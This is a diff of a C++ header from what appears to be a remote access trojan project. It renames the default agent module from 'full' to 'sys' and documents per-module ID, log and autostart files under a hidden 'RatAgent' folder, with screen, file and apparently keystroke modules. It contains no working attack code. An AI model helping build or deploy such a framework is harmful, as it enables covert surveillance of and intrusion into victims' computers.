@@ -7,7 +7,7 @@
 //   - <module>.log          日志互相覆盖
 //   - <module>.autostart.args  自启参数互相误触发
 //
-// 由各工程的预处理器定义提供：RAT_MODULE_ID="screen"（默认 "full"）。
+// 由各工程的预处理器定义提供：RAT_MODULE_ID="screen"（默认 "sys"）。
 //
 // 命名空间规则：
 //   %LOCALAPPDATA%\RatAgent\<module>.id / <module>.log / <module>.autostart.args
@@ -18,14 +18,14 @@
 //   DLL 导出 Stop 去停**任意模块**的实例（加了前缀反而只能停自己这一种）。
 //
 // 注意（新增模块工程时）：RAT_MODULE_ID 与 RAT_MODULE_CAPS 都**必须显式改写**，
-//   忘了改会得到 "full" + 全量能力位，和真正的全量 agent 撞在一起。
+//   忘了改会得到 "sys" + 系统类能力位，和全量（系统类）agent 撞在一起。
 #pragma once
 
 #include <cstdint>
 
-// 模块名（小写短名：full / screen / file / sys / template …）
+// 模块名（小写短名：sys / screen / file / keys / template …）
 #ifndef RAT_MODULE_ID
-#define RAT_MODULE_ID "full"
+#define RAT_MODULE_ID "sys"
 #endif
 
 namespace c2 {
